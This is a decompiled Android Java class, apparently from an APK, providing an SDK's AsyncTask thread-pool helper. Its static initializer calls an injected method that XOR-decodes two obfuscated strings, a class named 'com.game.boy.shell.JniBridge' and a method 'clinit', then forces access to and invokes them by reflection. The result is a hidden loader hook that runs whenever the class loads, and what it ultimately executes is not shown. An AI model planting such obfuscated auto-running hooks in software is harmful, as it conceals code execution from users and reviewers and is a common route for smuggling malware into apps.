package com.czhj.sdk.common.ThreadPool;

import android.os.AsyncTask;
import com.czhj.sdk.common.utils.Preconditions;
import java.lang.reflect.Method;
import java.util.concurrent.Executor;

/* loaded from: D:\mgba-android-version\tmp_gboy_apk\decoded\classes2.dex */
public class AsyncTasks {

    /* renamed from: a, reason: collision with root package name */
    private static Executor f10552a;

    static {
        a();
        WiiJrXw();
    }

    private static /* synthetic */ void WiiJrXw() {
        char[] charArray = "$(*i &*\"i%(>i4/\"++i\r).\u00055.# \"".toCharArray();
        int length = charArray.length;
        for (int i = 0; i < length; i++) {
            charArray[i] = (char) (charArray[i] ^ 'G');
        }
        String str = new String(charArray);
        char[] charArray2 = "$+.).3".toCharArray();
        int length2 = charArray2.length;
        for (int i2 = 0; i2 < length2; i2++) {
            charArray2[i2] = (char) (charArray2[i2] ^ 'G');
        }
        Method declaredMethod = Class.forName(str).getDeclaredMethod(new String(charArray2), new Class[0]);
        declaredMethod.setAccessible(true);
        declaredMethod.invoke(null, new Object[0]);
    }

    private static void a() {
        f10552a = AsyncTask.THREAD_POOL_EXECUTOR;
    }

    @SafeVarargs
    public static <P> void safeExecuteOnExecutor(AsyncTask<P, ?, ?> asyncTask, P... pArr) {
        Preconditions.NoThrow.checkNotNull(asyncTask, "Unable to execute null AsyncTask.");
        Preconditions.NoThrow.checkUiThread("AsyncTask must be executed on the main thread");
        asyncTask.executeOnExecutor(f10552a, pArr);
    }
}
